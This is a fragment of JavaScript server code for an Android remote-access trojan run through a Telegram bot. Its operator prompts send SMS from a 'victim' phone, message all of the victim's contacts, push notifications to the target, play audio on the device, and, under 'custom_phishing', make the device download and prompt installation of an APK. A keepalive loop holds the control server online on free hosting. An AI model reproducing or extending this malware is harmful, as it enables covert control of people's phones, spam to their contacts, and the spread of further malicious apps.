        show_notification: '°• 🦊𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐀𝐩𝐩𝐞𝐚𝐫 𝐀𝐬 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧👹\n\n• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ',
        play_audio: '°• 📞𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐀𝐮𝐝𝐢𝐨 𝐋𝐢𝐧𝐤 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐏𝐥𝐚𝐲♑\n\n• ᴇɴᴛᴇʀ ᴀ ᴅɪʀᴇᴄᴛ ᴍᴘ3/ᴏɢɢ ʟɪɴᴋ',
        send_message: '°• 🗯️𝐑𝐞𝐩𝐥𝐲 𝐎𝐟 𝐘𝐨𝐮𝐫 𝐕𝐢𝐜𝐭𝐢𝐦 𝐌𝐞𝐬𝐬𝐚𝐠𝐞🌨️\n\n• ᴇɴᴛᴇʀ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ ᴏʀ ᴢᴇʀᴏ ꜰᴏʀ ʟᴏᴄᴀʟ',
        send_message_to_all: '°• 🔄𝐄𝐍𝐓𝐄𝐑 𝐓𝐇𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐘𝐎𝐔 𝐖𝐀𝐍𝐓 𝐓𝐎 𝐒𝐄𝐍𝐃 𝐓𝐎 𝐀𝐋𝐋 𝐂𝐎𝐍𝐓𝐀𝐂𝐓𝐒👨‍👩‍👧‍👧\n\n• ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ꜱᴇɴᴅ ɪꜰ ᴛᴏᴏ ʟᴏɴɢ',
        custom_phishing: '°• 🛰️𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐃𝐢𝐫𝐞𝐜𝐭 𝐋𝐢𝐧𝐤 𝐎𝐟 𝐓𝐡𝐞 𝐀𝐏𝐊 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐈𝐧𝐬𝐭𝐚𝐥𝐥📲\n\n• ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ᴡɪʟʟ ᴅᴏᴡɴʟᴏᴀᴅ ᴀɴᴅ ᴘʀᴏᴍᴘᴛ ɪɴꜱᴛᴀʟʟ'
    };

    if (inputPrompts[commend]) {
        safeSend(() => bot.sendMessage(ownerId, inputPrompts[commend], {
            reply_markup: { force_reply: true },
            parse_mode: 'HTML'
        }));
    }
});

// ── KEEPALIVE PING ─────────────────────────────────────────────────────────
// Pings own URL every 4 min to keep free-tier hosts (Render etc.) alive
setInterval(() => {
    appSocket.clients.forEach(ws => {
        try { ws.send('ping'); } catch (_) {}
    });
    axios.get(selfUrl).catch(() => {});
}, 4 * 60 * 1000); // 4 minutes

// ── START ──────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => console.log(`[server] listening on :${PORT}`));
